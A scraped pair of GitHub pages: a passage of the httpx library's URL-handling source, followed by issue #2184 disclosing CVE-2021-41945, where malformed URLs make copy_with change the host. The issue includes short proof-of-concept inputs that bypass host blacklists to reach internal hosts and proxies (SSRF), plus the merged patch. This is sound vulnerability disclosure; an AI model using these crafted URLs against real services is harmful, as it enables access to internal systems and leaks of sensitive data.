 @property def fragment(self) -> str: """ The URL fragments, as used in HTML anchors. As a string, without the leading '#'. """ return unquote(self.\_uri\_reference.fragment or "")
 @property def raw(self) -> RawURL: """ The URL in the raw representation used by the low level transport API. See `BaseTransport.handle\_request`.
 Provides the (scheme, host, port, target) for the outgoing request. """ return ( self.raw\_scheme, self.raw\_host, self.port, self.raw\_path, )
 @property def is\_absolute\_url(self) -> bool: """ Return `True` for absolute URLs such as 'http://example.com/path', and `False` for relative URLs such as '/path'. """ # We don't use `.is\_absolute` from `rfc3986` because it treats # URLs with a fragment portion as not absolute. # What we actually care about is if the URL provides # a scheme and hostname to which connections should be made. return bool(self.\_uri\_reference.scheme and self.\_uri\_reference.host)
 @property def is\_relative\_url(self) -> bool: """ Return `False` for absolute URLs such as 'http://example.com/path', and `True` for relative URLs such as '/path'. """ return not self.is\_absolute\_url
 def copy\_with(self, \*\*kwargs: typing.Any) -> "URL": """ Copy this URL, returning a new URL with some components altered. Accepts the same set of parameters as the components that are made available via properties on the `URL` class.
 For example:
 url = httpx.URL("https://www.example.com").copy\_with(username="jo@gmail.com", password="a secret") assert url == "https://jo%40email.com:a%20secret@www.example.com" """ allowed = { "scheme": str, "username": str, "password": str, "userinfo": bytes, "host": str, "port": int, "netloc": bytes, "path": str, "query": bytes, "raw\_path": bytes, "fragment": str, "params": object, }
 # Step 1 # ====== # # Perform type checking for all supported keyword arguments. for key, value in kwargs.items(): if key not in allowed: message = f"{key!r} is an invalid keyword argument for copy\_with()" raise TypeError(message) if value is not None and not isinstance(value, allowed[key]): expected = allowed[key].\_\_name\_\_ seen = type(value).\_\_name\_\_ message = f"Argument {key!r} must be {expected} but got {seen}" raise TypeError(message)
 # Step 2 # ====== # # Consolidate "username", "password", "userinfo", "host", "port" and "netloc" # into a single "authority" keyword, for `rfc3986`. if "username" in kwargs or "password" in kwargs: # Consolidate "username" and "password" into "userinfo". username = quote(kwargs.pop("username", self.username) or "") password = quote(kwargs.pop("password", self.password) or "") userinfo = f"{username}:{password}" if password else username kwargs["userinfo"] = userinfo.encode("ascii")
 if "host" in kwargs or "port" in kwargs: # Consolidate "host" and "port" into "netloc". host = kwargs.pop("host", self.host) or "" port = kwargs.pop("port", self.port)
 if host and ":" in host and host[0] != "[": # IPv6 addresses need to be escaped within square brackets. host = f"[{host}]"
 kwargs["netloc"] = ( f"{host}:{port}".encode("ascii") if port is not None else host.encode("ascii") )
 if "userinfo" in kwargs or "netloc" in kwargs: # Consolidate "userinfo" and "netloc" into authority. userinfo = (kwargs.pop("userinfo", self.userinfo) or b"").decode("ascii") netloc = (kwargs.pop("netloc", self.netloc) or b"").decode("ascii") authority = f"{userinfo}@{netloc}" if userinfo else netloc kwargs["authority"] = authority
 # Step 3 # ====== # # Wrangle any "path", "query", "raw\_path" and "params" keywords into # "query" and "path" keywords for `rfc3986`. if "raw\_path" in kwargs: # If "raw\_path" is included, then split it into "path" and "query" components. raw\_path = kwargs.pop("raw\_path") or b"" path, has\_query, query = raw\_path.decode("ascii").partition("?") kwargs["path"] = path kwargs["query"] = query if has\_query else None
 else: if kwargs.get("path") is not None: # Ensure `kwargs["path"] = <url quoted str>` for `rfc3986`. kwargs["path"] = quote(kwargs["path"])
 if kwargs.get("query") is not None: # Ensure `kwargs["query"] = <str>` for `rfc3986`. # # Note that `.copy\_with(query=None)` and `.copy\_with(query=b"")` # are subtly different. The `None` style will not include an empty # trailing "?" character. kwargs["query"] = kwargs["query"].decode("ascii")
 if "params" in kwargs: # Replace any "params" keyword with the raw "query" instead. # # Ensure that empty params use `kwargs["query"] = None` rather # than `kwargs["query"] = ""`, so that generated URLs do not # include an empty trailing "?". params = kwargs.pop("params") kwargs["query"] = None if not params else str(QueryParams(params))
 # Step 4 # ====== # # Ensure any fragment component is quoted. if kwargs.get("fragment") is not None: kwargs["fragment"] = quote(kwargs["fragment"])
 # Step 5 # ====== # # At this point kwargs may include keys for "scheme", "authority", "path", # "query" and "fragment". Together these constitute the entire URL. # # See https://tools.ietf.org/html/rfc3986#section-3 # # foo://example.com:8042/over/there?name=ferret#nose # \\_/ \\_\_\_\_\_\_\_\_\_\_\_\_\_\_/\\_\_\_\_\_\_\_\_\_/ \\_\_\_\_\_\_\_\_\_/ \\_\_/ # | | | | | # scheme authority path query fragment return URL(self.\_uri\_reference.copy\_with(\*\*kwargs).unsplit())
 def copy\_set\_param(self, key: str, value: typing.Any = None) -> "URL": return self.copy\_with(params=self.params.set(key, value))
 def copy\_add\_param(self, key: str, value: typing.Any = None) -> "URL": return self.copy\_with(params=self.params.add(key, value))
 def copy\_remove\_param(self, key: str) -> "URL": return self.copy\_with(params=self.params.remove(key))
 def copy\_merge\_params(self, params: QueryParamTypes) -> "URL": return self.copy\_with(params=self.params.merge(params))
 def join(self, url: URLTypes) -> "URL": """ Return an absolute URL, using this URL as the base.
 Eg.
 url = httpx.URL("https://www.example.com/test") url = url.join("/new/path") assert url == "https://www.example.com/new/path" """ if self.is\_relative\_url: # Workaround to handle relative URLs, which otherwise raise # rfc3986.exceptions.ResolutionError when used as an argument # in `.resolve\_with`. return ( self.copy\_with(scheme="http", host="example.com") .join(url) .copy\_with(scheme=None, host=None) )
 # We drop any fragment portion, because RFC 3986 strictly # treats URLs with a fragment portion as not being absolute URLs. base\_uri = self.\_uri\_reference.copy\_with(fragment=None) relative\_url = URL(url) return URL(relative\_url.\_uri\_reference.resolve\_with(base\_uri).unsplit())
 def \_\_hash\_\_(self) -> int: return hash(str(self))
 def \_\_eq\_\_(self, other: typing.Any) -> bool: return isinstance(other, (URL, str)) and str(self) == str(URL(other))
 def \_\_str\_\_(self) -> str: return self.\_uri\_reference.unsplit()
 def \_\_repr\_\_(self) -> str: class\_name = self.\_\_class\_\_.\_\_name\_\_ url\_str = str(self) if self.\_uri\_reference.userinfo: # Mask any password component in the URL representation, to lower the # risk of unintended leakage, such as in debug information and logging. username = quote(self.username) url\_str = ( rfc3986.urlparse(url\_str) .copy\_with(userinfo=f"{username}:[secure]") .unsplit() ) return f"{class\_name}({url\_str!r})"
class QueryParams(typing.Mapping[str, str]): """ URL query parameters, as a multi-dict. """
 def \_\_init\_\_(self, \*args: QueryParamTypes, \*\*kwargs: typing.Any) -> None: assert len(args) < 2, "Too many arguments." assert not (args and kwargs), "Cannot mix named and unnamed arguments."
 value = args[0] if args else kwargs
 items: typing.Sequence[typing.Tuple[str, PrimitiveData]] if value is None or isinstance(value, (str, bytes)): value = value.decode("ascii") if isinstance(value, bytes) else value self.\_dict = parse\_qs(value) elif isinstance(value, QueryParams): self.\_dict = {k: list(v) for k, v in value.\_dict.items()} else: dict\_value: typing.Dict[typing.Any, typing.List[typing.Any]] = {} if isinstance(value, (list, tuple)): # Convert list inputs like: # [("a", "123"), ("a", "456"), ("b", "789")] # To a dict representation, like: # {"a": ["123", "456"], "b": ["789"]} for item in value: dict\_value.setdefault(item[0], []).append(item[1]) else: # Convert dict inputs like: # {"a": "123", "b": ["456", "789"]} # To dict inputs where values are always lists, like: # {"a": ["123"], "b": ["456", "789"]} dict\_value = { k: list(v) if isinstance(v, (list, tuple)) else [v] for k, v in value.items() }
 # Ensure that keys and values are neatly coerced to strings. # We coerce values `True` and `False` to JSON-like "true" and "false" # representations, and coerce `None` values to the empty string. self.\_dict = { str(k): [primitive\_value\_to\_str(item) for item in v] for k, v in dict\_value.items() }
 def keys(self) -> typing.KeysView: """ Return all the keys in the query params.
 Usage:
 q = httpx.QueryParams("a=123&a=456&b=789") assert list(q.keys()) == ["a", "b"] """ return self.\_dict.keys()
 def values(self) -> typing.ValuesView: """ Return all the values in the query params. If a key occurs more than once only the first item for that key is returned.
 Usage:
 q = httpx.QueryParams("a=123&a=456&b=789") assert list(q.values()) == ["123", "789"] """ return {k: v[0] for k, v in self.\_dict.items()}.values()
 def items(self) -> typing.ItemsView: """ Return all items in the query params. If a key occurs more than once only the first item for that key is returned.
 Usage:
 q = httpx.QueryParams("a=123&a=456&b=789") assert list(q.items()) == [("a", "123"), ("b", "789")] """ return {k: v[0] for k, v in self.\_dict.items()}.items()
 def multi\_items(self) -> typing.List[typing.Tuple[str, str]]: """ Return all items in the query params. Allow duplicate keys to occur.
 Usage:
 q = httpx.QueryParams("a=123&a=456&b=789") assert list(q.multi\_items()) == [("a", "123"), ("a", "456"), ("b", "789")] """ multi\_items: typing.List[typing.Tuple[str, str]] = [] for k, v in self.\_dict.items(): multi\_items.extend([(k, i) for i in v]) return multi\_items
 def get(self, key: typing.Any, default: typing.Any = None) -> typing.Any: """ Get a value from the query param for a given key. If the key occurs more than once, then only the first value is returned.
 Usage:
 q = httpx.QueryParams("a=123&a=456&b=789") assert q.get("a") == "123" """ if key in self.\_dict: return self.\_dict[str(key)][0] return default
 def get\_list(self, key: str) -> typing.List[str]: """ Get all values from the query param for a given key.
 Usage:
 q = httpx.QueryParams("a=123&a=456&b=789") assert q.get\_list("a") == ["123", "456"] """ return list(self.\_dict.get(str(key), []))
 def set(self, key: str, value: typing.Any = None) -> "QueryParams": """ Return a new QueryParams instance, setting the value of a key.
 Usage:
 q = httpx.QueryParams("a=123") q = q.set("a", "456") assert q == httpx.QueryParams("a=456") """ q = QueryParams() q.\_dict = dict(self.\_dict) q.\_dict[str(key)] = [primitive\_value\_to\_str(value)] return q
 def add(self, key: str, value: typing.Any = None) -> "QueryParams": """ Return a new QueryParams instance, setting or appending the value of a key.
 Usage:
 q = httpx.QueryParams("a=123") q = q.add("a", "456") assert q == httpx.QueryParams("a=123&a=456") """ q = QueryParams() q.\_dict = dict(self.\_dict) q.\_dict[str(key)] = q.get\_list(key) + [primitive\_value\_to\_str(value)] return q
 def remove(self, key: str) -> "QueryParams": """ Return a new QueryParams instance, removing the value of a key.
 Usage:
 q = httpx.QueryParams("a=123") q = q.remove("a") assert q == httpx.QueryParams("") """ q = QueryParams() q.\_dict = dict(self.\_dict) q.\_dict.pop(str(key), None) return q
 def merge(self, params: QueryParamTypes = None) -> "QueryParams": """ Return a new QueryParams instance, updated with.
 Usage:
 q = httpx.QueryParams("a=123") q = q.merge({"b": "456"}) assert q == httpx.QueryParams("a=123&b=456")
 q = httpx.QueryParams("a=123") q = q.merge({"a": "456", "b": "789"}) assert q == httpx.QueryParams("a=456&b=789") """ q = QueryParams(params) q.\_dict = {\*\*self.\_dict, \*\*q.\_dict} return q
 def \_\_getitem\_\_(self, key: typing.Any) -> str: return self.\_dict[key][0]
 def \_\_contains\_\_(self, key: typing.Any) -> bool: return key in self.\_dict
 def \_\_iter\_\_(self) -> typing.Iterator[typing.Any]: return iter(self.keys())
 def \_\_len\_\_(self) -> int: return len(self.\_dict)
 def \_\_bool\_\_(self) -> bool: return bool(self.\_dict)
 def \_\_hash\_\_(self) -> int: return hash(str(self))
 def \_\_eq\_\_(self, other: typing.Any) -> bool: if not isinstance(other, self.\_\_class\_\_): return False return sorted(self.multi\_items()) == sorted(other.multi\_items())
 def \_\_str\_\_(self) -> str: return urlencode(self.multi\_items())
 def \_\_repr\_\_(self) -> str: class\_name = self.\_\_class\_\_.\_\_name\_\_ query\_string = str(self) return f"{class\_name}({query\_string!r})"
 def update(self, params: QueryParamTypes = None) -> None: raise RuntimeError( "QueryParams are immutable since 0.18.0. " "Use `q = q.merge(...)` to create an updated copy." )
 def \_\_setitem\_\_(self, key: str, value: str) -> None: raise RuntimeError( "QueryParams are immutable since 0.18.0. " "Use `q = q.set(key, value)` to create an updated copy." )

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_b4372f3c_20250114_181224.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fissues%2F2184)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fissues%2F2184)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=encode%2Fhttpx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[encode](/encode)
/
**[httpx](/encode/httpx)**
Public

* [Notifications](/login?return_to=%2Fencode%2Fhttpx) You must be signed in to change notification settings
* [Fork
  856](/login?return_to=%2Fencode%2Fhttpx)
* [Star
   13.6k](/login?return_to=%2Fencode%2Fhttpx)

* [Code](/encode/httpx)
* [Issues
  43](/encode/httpx/issues)
* [Pull requests
  33](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

Additional navigation options

* [Code](/encode/httpx)
* [Issues](/encode/httpx/issues)
* [Pull requests](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fencode%2Fhttpx%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fencode%2Fhttpx%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Some URL can make httpx use URL with wrong info #2184

Closed

[lebr0nli](/lebr0nli) opened this issue
Apr 21, 2022
· 11 comments

Closed

# [Some URL can make httpx use URL with wrong info](#top) #2184

[lebr0nli](/lebr0nli) opened this issue
Apr 21, 2022
· 11 comments

## Comments

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=80&u=5dbd8d1119fb216651198811601296a26df51354&v=4)](/lebr0nli)

Copy link

Contributor

### **[lebr0nli](/lebr0nli)** commented [Apr 21, 2022](#issue-1210457678) • edited Loading

| After some research, I found that `httpx.Client` and `httpx.Proxy` may implicit parse wrong URL because of the improper implement of `httpx.URL().copy_with`.  And this issue may lead to some blacklist bypass.  For example:   * `httpx.Client`  ``` user_input_from_http_request = 'http:////admin-dashboard/secret' u = httpx.URL(user_input_from_http_request) assert u.host.lower() != 'admin-dashboard' resp = httpx.Client(base_url=u).get('/') # SSRF to http://admin-dashboard/secret print(resp.text) # sensitive data leak ```  * `httpx.Proxy`  ``` user_input_from_http_request = 'http://x@//internal-proxy:8082/' u = httpx.URL(user_input_from_http_request) assert u.host.lower() != 'internal-proxy' # httpx.Proxy(u).url.netloc == b'internal-proxy:8082' resp = httpx.Client(proxies=u).get('http://localhost/secret') # will request via http proxy at internal-proxy:8082 ```  Main reason:     [httpx/httpx/\_urls.py](https://github.com/encode/httpx/blob/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552/httpx/_urls.py#L487)  Line 487 in [b07fe7b](/encode/httpx/commit/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552)   |  | return URL(self.\_uri\_reference.copy\_with(\*\*kwargs).unsplit()) | | --- | --- |      `copy_with` parse `self._uri_reference.copy_with(**kwargs).unsplit()` before returning the new URL, but the new URL string return by `unsplit` may make some unintended changes on the new URL.  For example:  ``` print(httpx.URL('http://[invalid string!!!!]//localhost/test!'). _uri_reference.unsplit()) # output: http://localhost/test! u = httpx.URL('http://[invalid string!!!!]//localhost/test!').copy_with(scheme='https') # I only want to change scheme print(u.host) # output: localhost # oops, host changed! ```  So if a function is using `copy_with`, it may have the same issue as `httpx.Client` and `httpx.Proxy`, too (For example, `copy_set_param`).  I also made a patch PR for this issue by replacing `return URL(self._uri_reference.copy_with(**kwargs).unsplit())` to:  ```         new_url = URL(self)         new_url._uri_reference = self._uri_reference.copy_with(**kwargs)         if new_url.is_absolute_url:             new_url._uri_reference = new_url._uri_reference.normalize()         return URL(new_url) ```  ~~By the way, I think this issue is similar to [CWE-172](https://cwe.mitre.org/data/definitions/707.html) and [CWE-20](https://cwe.mitre.org/data/definitions/20.html).~~  ~~If you want to request a CVE id for this issue to remind httpx's user, you can use these categories.~~  Updated: This has been assigned as [CVE-2021-41945](https://github.com/advisories/GHSA-h8pj-cxx2-jfg2 "CVE-2021-41945"). |
| --- | --- | --- |
| The text was updated successfully, but these errors were encountered: |

 👍
6
 gh640, martinpeck, Mason-Lin, florimondmanca, yan12125, and ahnjaeshin reacted with thumbs up emoji

All reactions

* 👍
  6 reactions

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&u=5dbd8d1119fb216651198811601296a26df51354&v=4)](/lebr0nli)
[lebr0nli](/lebr0nli)
mentioned this issue
[Apr 21, 2022](#ref-pullrequest-1210457945)

[Patch `copy_with`
#2185](/encode/httpx/pull/2185)
 Merged

[![@Kludex](https://avatars.githubusercontent.com/u/7353520?s=80&u=df8a3f06ba8f55ae1967a3e2d5ed882903a4e330&v=4)](/Kludex)

Copy link

Member

### **[Kludex](/Kludex)** commented [May 2, 2022](#issuecomment-1114814231)

| [@tomchristie](https://github.com/tomchristie) [@florimondmanca](https://github.com/florimondmanca) <https://nvd.nist.gov/vuln/detail/CVE-2021-41945> |
| --- |

All reactions

Sorry, something went wrong.

[![@br3ndonland](https://avatars.githubusercontent.com/u/26674818?s=80&u=c0ea6b2944527239e7c7d9b469e277f475ed0ed7&v=4)](/br3ndonland)

Copy link

### **[br3ndonland](/br3ndonland)** commented [May 2, 2022](#issuecomment-1115450453)

| GitHub has added this to their advisory database, and it is now being picked up by Dependabot dependency scanning.   * [GHSA-h8pj-cxx2-jfg2](https://github.com/advisories/GHSA-h8pj-cxx2-jfg2 "GHSA-h8pj-cxx2-jfg2") * [Potential security issue by abuse the URL object #1831](https://github.com/encode/httpx/discussions/1831) |
| --- |

 👍
5
 martinpeck, dashk, wong-codaio, hamie96, and agnesk92 reacted with thumbs up emoji

All reactions

* 👍
  5 reactions

Sorry, something went wrong.

[![@dashk](https://avatars.githubusercontent.com/u/382644?s=80&u=a485679be8d5522b457051f920b678026c4e2fca&v=4)](/dashk)

Copy link

### **[dashk](/dashk)** commented [May 7, 2022](#issuecomment-1120184392)

| 👋 When is the next release scheduled? Would love to pick up [#2185](https://github.com/encode/httpx/pull/2185), since it addresses [CVE-2021-41945](https://nvd.nist.gov/vuln/detail/CVE-2021-41945) 🙏 |
| --- |

 👍
11
 kurbezz, shahakL, AndreMPCosta, wong-codaio, hamie96, fsiola, yan12125, albireox, sdrll, agnesk92, and Iain-S reacted with thumbs up emoji

All reactions

* 👍
  11 reactions

Sorry, something went wrong.

[![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=80&u=afcdb67ec485900d025d18270a115085e3f0f909&v=4)](/tomchristie)

Copy link

Member

### **[tomchristie](/tomchristie)** commented [May 9, 2022](#issuecomment-1121073221)

| Release pull request... [#2214](https://github.com/encode/httpx/pull/2214) |
| --- |

 👍
8
 wong-codaio, kurbezz, br3ndonland, hamie96, sbrinkerhoff, fsiola, mastrolube, and darrelldavis reacted with thumbs up emoji

All reactions

* 👍
  8 reactions

Sorry, something went wrong.

[![@yan12125](https://avatars.githubusercontent.com/u/1937689?s=80&v=4)](/yan12125)

Copy link

### **[yan12125](/yan12125)** commented [May 15, 2022](#issuecomment-1126905908)

| This may be useful for Linux distro packagers: I created a manual backport <https://github.com/archlinux/svntogit-community/blob/packages/python-httpx/trunk/CVE-2021-41945.diff> as commit [e9b0c85](https://github.com/encode/httpx/commit/e9b0c85dd4f4e4469c57c4b38e5101fd12081b5c) cannot be applied directly onto version 0.22.0. |
| --- |

All reactions

Sorry, something went wrong.

[![@hugovk](https://avatars.githubusercontent.com/u/1324225?s=80&u=d7e2522cc357c1b8fed0f1c623c68c7331c70c56&v=4)](/hugovk)

Copy link

Contributor

### **[hugovk](/hugovk)** commented [May 16, 2022](#issuecomment-1127277208)

| PR [#2185](https://github.com/encode/httpx/pull/2185) has been merged, can this be closed? |
| --- |

 👍
1
 yan12125 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@erdnaxeli](https://avatars.githubusercontent.com/u/479441?s=80&u=1a89b97dee4f084b8d745c0fea96a7955c7265d9&v=4)](/erdnaxeli)

Copy link

### **[erdnaxeli](/erdnaxeli)** commented [May 17, 2022](#issuecomment-1128590423)

| A stable version with this fix has not been released yet, this can't be closed. |
| --- |

 👍
4
 novotl, agnesk92, powlo, and 1fabunicorn reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@mittomen](https://avatars.githubusercontent.com/u/14975583?s=80&u=967734b8acef9ec1943490028900de267e736438&v=4)](/mittomen)

Copy link

### **[mittomen](/mittomen)** commented [May 23, 2022](#issuecomment-1134756280)

| This looks a bit odd to me that this critical vulnerability hasn't been released, even though the fix has been merged more than a month now. This project looks pretty nice, but then people must also pay attention on both resolving and releasing critical problems immediately. Such long-lasting response may turn users away from using your work as we are considering that within our organisation too... |
| --- |

All reactions

Sorry, something went wrong.

[![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=80&u=afcdb67ec485900d025d18270a115085e3f0f909&v=4)](/tomchristie)

Copy link

Member

### **[tomchristie](/tomchristie)** commented [May 23, 2022](#issuecomment-1134826122)

| Now released as 0.23.0 |
| --- |

 👍
2
 mittomen and B3QL reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=40&u=afcdb67ec485900d025d18270a115085e3f0f909&v=4)](/tomchristie)
[tomchristie](/tomchristie)
closed this as [completed](/encode/httpx/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[May 23, 2022](#event-6662197166)

[![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=80&u=afcdb67ec485900d025d18270a115085e3f0f909&v=4)](/tomchristie)

Copy link

Member

### **[tomchristie](/tomchristie)** commented [May 23, 2022](#issuecomment-1134829394) • edited Loading

| If anyone knows the process for updating those advisories, then marking them as resolved would be very much welcome.   * GitHub: [GHSA-h8pj-cxx2-jfg2](https://github.com/advisories/GHSA-h8pj-cxx2-jfg2 "GHSA-h8pj-cxx2-jfg2") * NIST: <https://nvd.nist.gov/vuln/detail/CVE-2021-41945> |
| --- |

All reactions

Sorry, something went wrong.

[![@novotl](https://avatars.githubusercontent.com/u/42157644?s=40&v=4)](/novotl)
[novotl](/novotl)
mentioned this issue
[May 23, 2022](#ref-issue-1245441603)

[Allow httpx 0.23.0
sanic-org/sanic-testing#38](/sanic-org/sanic-testing/issues/38)

Closed

[![@Bibo-Joshi](https://avatars.githubusercontent.com/u/22366557?s=80&u=9bf3dd22bc021d28924607ffef11efad2546f4de&v=4)](/Bibo-Joshi)

Copy link

### **[Bibo-Joshi](/Bibo-Joshi)** commented [May 23, 2022](#issuecomment-1134900852)

| For [GHSA-h8pj-cxx2-jfg2](https://github.com/advisories/GHSA-h8pj-cxx2-jfg2 "GHSA-h8pj-cxx2-jfg2"), there is a "Suggest improvements" which apparently opens a PR. Leaving that here as FYI since a PR was already submitted: [github/advisory-database#322](https://github.com/github/advisory-database/pull/322). |
| --- |

 👍
1
 br3ndonland reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@chris48s](https://avatars.githubusercontent.com/u/6025893?s=40&v=4)](/chris48s)
[chris48s](/chris48s)
mentioned this issue
[May 24, 2022](#ref-pullrequest-1245707154)

[Bump httpx from 0.22.0 to 0.23.0
chris48s/json-schema-viewer#27](/chris48s/json-schema-viewer/pull/27)
 Merged

[![@ramiswailem](https://avatars.githubusercontent.com/u/26059392?s=40&v=4)](/ramiswailem)
[ramiswailem](/ramiswailem)
mentioned this issue
[May 25, 2022](#ref-issue-1248050923)

[Can't upgrade to httpx 0.23.0 because "fastapi-mail 1.0.8 depends on httpx<0.23.0 and >=0.22.0
sabuhish/fastapi-mail#124](/sabuhish/fastapi-mail/issues/124)

Closed

[![@sbdchd](https://avatars.githubusercontent.com/u/7340772?s=40&v=4)](/sbdchd)
[sbdchd](/sbdchd)
mentioned this issue
[Jul 4, 2022](#ref-issue-1286975104)

[docker image scan reports issues
chdsbd/kodiak#823](/chdsbd/kodiak/issues/823)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fissues%2F2184)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

10 participants

[![@dashk](https://avatars.githubusercontent.com/u/382644?s=52&v=4)](/dashk) [![@erdnaxeli](https://avatars.githubusercontent.com/u/479441?s=52&v=4)](/erdnaxeli) [![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=52&v=4)](/tomchristie) [![@hugovk](https://avatars.githubusercontent.com/u/1324225?s=52&v=4)](/hugovk) [![@yan12125](https://avatars.githubusercontent.com/u/1937689?s=52&v=4)](/yan12125) [![@Kludex](https://avatars.githubusercontent.com/u/7353520?s=52&v=4)](/Kludex) [![@mittomen](https://avatars.githubusercontent.com/u/14975583?s=52&v=4)](/mittomen) [![@Bibo-Joshi](https://avatars.githubusercontent.com/u/22366557?s=52&v=4)](/Bibo-Joshi) [![@br3ndonland](https://avatars.githubusercontent.com/u/26674818?s=52&v=4)](/br3ndonland) [![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=52&v=4)](/lebr0nli)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


